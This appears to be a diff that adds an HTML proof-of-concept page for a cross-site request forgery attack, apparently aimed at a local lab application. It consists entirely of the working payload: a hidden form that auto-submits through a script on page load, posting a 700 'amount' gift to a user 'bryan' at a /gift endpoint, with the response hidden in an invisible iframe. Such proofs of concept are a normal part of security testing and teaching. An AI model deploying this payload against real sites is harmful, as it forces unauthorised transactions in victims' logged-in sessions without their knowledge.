@@ -1,0 +1,16 @@
+<html>
+	<head>
+		<title>POC attack</title>
+	</head>
+	<body>
+		<h1>Pwn press F</h1>
+		<form action="http://127.0.0.1:80/gift/0" method="post" target="hiddenframe" name="csrfform">
+		
+		        <input type="hidden" name="amount" value="700" /> 
+			<input type="hidden" name="username" value="bryan" /> 
+			
+		 <script>document.csrfform.submit();</script>
+		</form>
+		<iframe name="hiddenframe" style="display: none;"></iframe>
+	</body>
+</html>
